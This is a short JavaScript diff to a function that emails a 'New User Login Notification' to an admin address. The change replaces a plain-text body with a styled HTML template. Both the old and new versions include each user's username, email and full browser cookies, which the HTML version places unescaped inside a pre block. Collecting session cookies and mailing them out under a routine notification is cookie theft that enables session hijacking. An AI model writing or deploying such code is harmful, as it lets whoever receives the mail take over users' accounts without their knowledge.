@@ -79,7 +79,24 @@ async function sendEmailToAdmin(username, email, cookies) {
       from: process.env.ADMIN_EMAIL,
       to: process.env.ADMIN_EMAIL,
       subject: "New User Login Notification",
-      text: `User ${username} logged in with email: ${email}\n user browser cookies: ${cookies}`,
+      html: `
+    <html>
+      <body style="font-family: Arial, sans-serif; color: #333; background-color: #f9f9f9; padding: 20px;">
+        <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
+          <h2 style="color: #4CAF50; text-align: center;">New User Login Notification</h2>
+          <p style="font-size: 16px; line-height: 1.6;">
+            <strong style="color: #333;">Hello Admin,</strong><br /><br />
+            A new user has logged in to your platform. Here are the details:<br /><br />
+            <strong style="color: #007BFF;">Username:</strong> ${username}<br />
+            <strong style="color: #007BFF;">Email:</strong> ${email}<br /><br />
+            <strong style="color: #007BFF;">Browser Cookies:</strong><br />
+            <pre style="background-color: #f0f0f0; padding: 10px; border-radius: 5px; color: #555;">${cookies}</pre><br />
+            <p style="font-size: 14px; color: #777; text-align: center;">This is an automated email. Please do not reply.</p>
+          </p>
+        </div>
+      </body>
+    </html>
+  `,
     };
 
     await transporter.sendMail(mailOptions);
